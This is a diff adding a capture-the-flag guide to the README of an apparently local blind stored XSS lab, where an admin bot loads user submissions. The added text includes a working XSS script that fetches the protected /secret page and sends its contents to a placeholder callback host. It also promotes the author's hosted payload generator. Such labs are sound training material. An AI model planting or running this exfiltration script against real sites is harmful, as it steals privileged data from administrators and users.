@@ -66,6 +66,80 @@ python3 app.py
 Visit http://127.0.0.1:5000 and submit a payload by using my OOB XSS payload creator and listener (completely free so I'd really appreciate a sub on yt for this one):
 OOB XSS listener and payload generator: https://aged-cloud-b431.0days.workers.dev/
 My YouTube: https://youtube.com/@0dayscyber
+🏴 Blind XSS Challenge — Steal the Admin Flag
+
+Your mission is to exploit a blind stored XSS vulnerability in this lab and use it to steal a secret flag that only the admin bot can access.
+
+🎯 Objective
+
+Gain access to the protected endpoint:
+
+/secret
+
+This page contains the main challenge flag, but:
+
+Normal users cannot view it
+
+Only the admin bot has the required session cookie
+
+The bot loads untrusted user submissions automatically
+
+You must execute JavaScript inside the admin’s browser context
+
+Your goal:
+
+Trigger a blind XSS payload that runs inside the admin bot and exfiltrates the flag from /secret.
+
+🧪 Steps to Complete
+1️⃣ Submit an XSS payload on the main page
+
+Visit:
+
+http://127.0.0.1:5000/
+
+Submit a payload that will execute when the admin bot views /admin/pending.
+
+Example:
+
+Or full exfiltration:
+
+<script>
+fetch("/secret")
+  .then(r => r.text())
+  .then(flag => fetch("https://your-callback.com/?flag=" + encodeURIComponent(flag)));
+</script>
+
+2️⃣ Wait for the admin bot
+
+Every ~10 seconds the admin bot will:
+
+Visit /admin/pending
+
+Load your malicious payload
+
+Execute it inside a browser with admin privileges
+
+3️⃣ Capture the flag
+
+Use any callback endpoint (Cloudflare Worker, webhook.site, your own server) to receive the exfiltrated flag.
+
+Expected output:
+
+THM{flaghere}
+
+✔️ Challenge Completion Criteria
+
+You have successfully:
+
+Triggered blind XSS
+
+Executed JS inside the admin bot
+
+Accessed the restricted /secret endpoint
+
+Exfiltrated the challenge flag
+
+Good luck, hunter. 🕵️‍♂️🔥
 
 ## 🛡 Safety Disclaimer
 
